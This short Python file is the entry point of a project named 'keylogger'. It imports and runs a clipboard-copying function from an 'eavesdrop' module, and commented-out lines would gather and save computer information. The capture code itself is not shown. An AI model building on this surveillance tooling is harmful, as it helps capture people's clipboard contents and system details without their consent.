from keylogger.eavesdrop import copy_clipboard


def print_hello_world(name):
    print(f'Hello, {name}')


if __name__ == '__main__':
    # print_hello_world('World!') # REMOVE IT, AFTER PROJECT FINISH
    # file_path = ""  # file path for files to be saved to
    # SystemInfoProvider().fetch_and_save_computer_information(file_path)
    copy_clipboard()
